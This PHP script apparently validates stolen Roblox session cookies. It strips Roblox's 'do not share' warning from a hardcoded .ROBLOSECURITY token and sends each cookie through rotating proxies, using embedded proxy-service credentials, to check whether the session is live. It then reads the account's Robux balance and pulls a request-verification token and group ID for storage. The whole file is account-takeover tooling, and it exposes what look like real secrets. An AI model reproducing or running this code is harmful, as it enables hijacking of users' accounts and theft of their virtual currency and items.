<?php
function doLog($text) {
    echo $text . "<br />";
}
function contains($needle, $haystack)
{
    return strpos($haystack, $needle) !== false;
}

try {
    $cookies = [
        "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_146E31A0BA482103F45E533521FC27A75E3E355A139184ED2296BB2D17F98FF660986D587806A93EA662C2B7C89287A6A53C92655337DC4F0E21D6848295049F1324CB233804DABB847E7A6F34E546574FEE98BD377B5BBE14722890EDC25D04965CDA0E60988AD05A109E5E5CBF06C1F3BC128A85F03877FB256BD6A82697F0A16B352E667D90CF626CECF00007BA98E3E5AC1F22B0EEB15D9B14C0E149C9EDFB71C5A8F32DA9AC5313FEF7AF155EB65BF31D1D5A8A8AB4474581116877755754957E5AD146F892A7977410B2FA7B8A2818F9FBB100847D86DE0BC48F51ED2B9D4ED1BA85C773921D0B16322687DEE1E17EF846C30C120B925A3F7E7AE01D7D703BA7DDB067B1C66084BAD386D38EAE707A434FDA4E40102598EFADE558D41785F59E74A6490FFE0EB1C69A74DBAC30DA10FFB6AA393D879A63E099A34B721C129115E8"
    ];
    $cookiesCount = count($cookies);
    doLog("Got $cookiesCount cookies");
    $proxy_auth = 'm0acp7k55faq9ie:siGyAJaNqtnDfOu4@residential.proxyscrape.com:8080';
    $proxies = [
        '104.144.129.66:3128',
        '104.144.179.73:3128',
        '104.144.184.76:3128',
    ];
    $count = 0;
    foreach ($cookies as $cookie) {
        $proxy = $proxies[array_rand($proxies)];
        $count++;
        doLog('');
        if (contains('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', $cookie)) {
	$cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_','',$cookie);
        }
        $cookie = preg_replace('/\s+/', '', $cookie);
        doLog("Testing $count/$cookiesCount");
        if (strlen($cookie) < 100) {
	doLog("Cookie too short!");
	continue;
        }
        doLog('Making request to Roblox');

        $c = curl_init('https://www.roblox.com/games/5551657553/Business-Legends');
        curl_setopt($c, CURLOPT_HTTPHEADER, array(
	'Cookie: .ROBLOSECURITY=' . $cookie . "",
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36'
        ));
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_HEADER, 1);
        curl_setopt($c, CURLOPT_PROXY, $proxy);
        curl_setopt($c, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($c, CURLOPT_PROXYUSERPWD, $proxy_auth);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, FALSE);
        $response = curl_exec($c);
        $header_size = curl_getinfo($c, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $header_size);
        $response = substr($response, $header_size);
        curl_close($c);
        $old = 1;

        if (!contains('data-userid', $response)) {

	$c = null;
	$c = curl_init('https://web.roblox.com/games/5551657553/Business-Legends');
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
	    'Cookie: .ROBLOSECURITY=' . $cookie . "",
	    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36'
	));
	curl_setopt($c, CURLOPT_PROXYTYPE, 'HTTP');
	curl_setopt($c, CURLOPT_PROXYUSERPWD, $proxy_auth);
	curl_setopt($c, CURLOPT_PROXY, $proxy);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HEADER, 1);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, FALSE);
	$response = curl_exec($c);

	if ($response === false) {
	    throw new Exception(curl_error($c), curl_errno($c));
	}
	$header_size = curl_getinfo($c, CURLINFO_HEADER_SIZE);
	$header = substr($response, 0, $header_size);
	$response = substr($response, $header_size);
	curl_close($c);

	if (!contains('data-userid', $response)) {
	    doLog('Cookie invalid');
	    continue;
	}
	$old = 0;
        }

        $robux = explode(' ',explode('data-user-balance-robux=',$response)[1])[0];
        doLog('Cookie valid, robux balance -> ' . $robux);
        doLog('Fetching RequestVerificationToken');

        if (!contains('__RequestVerificationToken', $header)) {
	doLog('Failed fetching RequestVerificationToken');
	continue;
        }
        $RequestVerificationToken = explode('; ',explode('__RequestVerificationToken=',$header)[1])[0];
        $g_start_index = strpos($response,'/groups/');
        $gid = substr($response, ($g_start_index + 8) , 7);
        var_dump($gid);exit;

        doLog("Fetched token.");
        doLog("GID $gid");
        doLog("Putting in database..");

    }

} catch(\Exception $e) {
    echo $e->getMessage();
}